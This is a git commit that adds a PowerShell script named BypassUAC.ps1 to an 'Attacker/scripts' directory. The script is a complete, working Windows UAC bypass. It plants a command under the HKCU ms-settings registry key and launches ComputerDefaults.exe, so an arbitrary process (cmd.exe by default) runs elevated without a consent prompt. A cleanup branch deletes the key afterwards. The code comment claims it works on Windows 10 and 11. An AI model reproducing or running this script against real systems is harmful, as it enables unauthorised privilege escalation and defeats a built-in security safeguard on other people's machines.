19142995ace9504cc4a38fa43e3fe3008b4fd76a
CrimsonLabs <61641716+crimsonlabs-io@users.noreply.github.com>
2022-06-04 17:01:03 +0800

    Create BypassUAC.ps1

---
+++ Attacker/scripts/BypassUAC.ps1
@@ -0,0 +1,28 @@
+Function BypassUAC {
+
+<#
+
+https://crimsonlabs.io/posts/2022/04/this-uac-bypass-still-works/
+
+By default, starts a desktop cmd.exe process.
+Tested and fully working on Windows 10 & 11.
+
+#>
+
+    Param (
+        [Parameter(Mandatory = $False)]
+        [String] $Process = "C:\windows\system32\cmd.exe",
+        [String] $Arguments = ""
+    )
+
+    If ( (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") ) {
+            Remove-Item "HKCU:\software\classes\ms-settings" -Force -Recurse
+    } Else {
+            $RegistryKey = "HKCU:\software\classes\ms-settings\shell\open\command"
+            New-Item $RegistryKey -Force
+            New-ItemProperty $RegistryKey -Name "DelegateExecute" -Value $null -Force
+            Set-ItemProperty $RegistryKey -Name "(default)" -Value "$Process $Arguments" -Force
+            Start-Process "ComputerDefaults.exe"
+    }
+    
+}
